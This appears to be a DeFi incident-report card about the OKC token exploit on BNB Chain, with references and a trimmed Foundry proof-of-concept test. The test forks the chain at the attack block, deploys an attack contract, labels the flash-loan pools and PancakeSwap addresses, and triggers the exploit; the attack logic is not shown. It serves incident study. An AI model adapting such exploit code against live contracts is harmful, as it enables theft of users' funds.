# [?] OKC Project - Instant Rewards, Unlocked

## Summary
Severity: Unknown
Chain: BNB Chain
Component: OKC
Published: 2023-11-14
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/OKC_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$6268
References:
- https://lunaray.medium.com/okc-project-hack-analysis-0907312f519b
- https://dashboard.tenderly.co/tx/bnb/0xd85c603f71bb84437bc69b21d785f982f7630355573566fa365dbee4cd236f08

```solidity
contract ContractTest is Test {
    AttackContract public attack_contract;

    function setUp() public {
        vm.createSelectFork("bsc", 33_464_598);
        assertEq(block.number, 33_464_598);
        attack_contract = new AttackContract();
        setLabel();
        vm.deal(address(this), 1 ether);
    }

    function setLabel() private {
        vm.label(address(this), "Attacker");
        vm.label(address(attack_contract), "AttackContract");
        vm.label(address(attack_contract.DPP1()), "0x8191_DPPAdvanced");
        vm.label(address(attack_contract.DPP2()), "0xfeaf_DPPOracle");
        vm.label(address(attack_contract.DPP3()), "0x26d0_DPPOracle");
        vm.label(address(attack_contract.DPP4()), "0x6098_DPP");
        vm.label(address(attack_contract.DPP4()), "0x6098_DPP");
        vm.label(address(attack_contract.DPP5()), "0x9ad3_DPPOracle");
        vm.label(address(attack_contract.pancakeV3Pool()), "PancakeV3Pool");
        vm.label(address(attack_contract.pancakePair_USDT_OKC()), "PancakePair_USDT_OKC");
        vm.label(address(attack_contract.USDT()), "USDT");
        vm.label(address(attack_contract.OKC()), "OKC");
        vm.label(address(attack_contract.pancakeRouter()), "PancakeRouter");
    }

    function testExploit() public {
        // 0.000000000000000001
        attack_contract.expect1{value: 1 ether}();
    }
}
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/OKC_exp.sol_
